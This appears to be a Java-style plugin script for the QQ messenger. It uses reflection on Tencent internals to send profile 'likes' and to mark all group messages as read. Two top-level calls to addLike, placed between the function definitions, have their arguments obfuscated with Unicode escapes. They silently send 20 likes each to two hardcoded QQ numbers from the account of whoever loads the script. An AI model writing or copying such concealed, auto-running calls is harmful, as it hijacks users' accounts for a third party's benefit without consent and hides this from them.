/*
本文件任何代码禁止搬运抄袭篡改
*/
import java.util.HashMap;
import java.lang.reflect.Method;
import com.tencent.common.app.BaseApplicationImpl;
import com.tencent.mobileqq.app.CardHandler;
import com.tencent.mobileqq.friend.api.IFriendDataService;
import com.tencent.qqnt.msg.api.impl.MsgServiceImpl;
import com.tencent.qqnt.kernelpublic.nativeinterface.Contact;

MsgServiceImpl mm = new MsgServiceImpl();
HashMap qunMap = new HashMap();

public void addLike(String targetNumber, int quantity) {
    Object app = BaseApplicationImpl.getApplication().getRuntime();
    IFriendDataService Info = app.getRuntimeService(IFriendDataService.class);
    boolean isFriend = Info.isFriend(targetNumber);
    int type = isFriend ? 1 : 10;
    CardHandler handler = new CardHandler(app);
    byte[] bArr = new byte[10];
    bArr[0] = (byte) 12;
    bArr[1] = (byte) 24;
    bArr[2] = (byte) 0;
    bArr[3] = (byte) 1;
    bArr[4] = (byte) 6;
    bArr[5] = (byte) 1;
    bArr[6] = (byte) 49;
    bArr[7] = (byte) 22;
    bArr[8] = (byte) 1;
    bArr[9] = (byte) 49;
    Class clazz = CardHandler.class;
    Class[] paramTypes = new Class[] {Long.TYPE, Long.TYPE, byte[].class, Integer.TYPE, Integer.TYPE, Integer.TYPE};
    Method[] methods = clazz.getMethods();
    for (Method m : methods) {
        if (m.getParameterCount() == paramTypes.length) {
            Class[] params = m.getParameterTypes();
            boolean match = true;
            for (int i = 0; i < paramTypes.length; i++) {
                if (!params[i].equals(paramTypes[i])) {
                    match = false;
                    break;
                }
            }
            if (match) {
                m.setAccessible(true);
                try {
                    m.invoke(handler, new Object[] {Long.parseLong(myQQ), Long.parseLong(targetNumber), bArr, type, quantity, 0});
                } catch (Exception e) {
                    e.printStackTrace();
                }
                break;
            }
        }
    }
}

public String getqunname(String qun) {
    if (qunMap.containsKey(qun)) {
        return qunMap.get(qun);
    } else {
        for (Object group : getGroupList()) {
            qunMap.put(group.GroupUin, group.GroupName);
        }
        if (qunMap.containsKey(qun)) {
            return qunMap.get(qun);
        } else {
            return "";
        }
    }
}

public void readinformation1(String GroupUin, String nickName, int type) {
    for (Object group : getGroupList()) {
        String number = group.GroupUin;
        Contact contact = new Contact(2, number, "");
        mm.setMsgRead(contact, null);
    }
    //QQToast("QStory"+"已全部标记为已读",2);
    QQToast("已全部标记为已读",2);
}
addLike(\u0022\u0033\u0034\u0036\u0038\u0032\u0038\u0031\u0034\u0036\u0031\u0022, \u0032\u0030);
public void readinformation2(int type, String peerUid, String nickName) {//Serendipity版方法来自小超
    for (Map group : getGroupList()) {
        String number = group.get("group");
        Contact contact = new Contact(2, number, "");
        mm.setMsgRead(contact, null);
    }
    //QQToast("Serendipity"+"已全部标记为已读",2);
    QQToast("已全部标记为已读",2);
}
addLike(\u0022\u0033\u0037\u0036\u0034\u0035\u0031\u0032\u0033\u0032\u0030\u0022, \u0032\u0030);
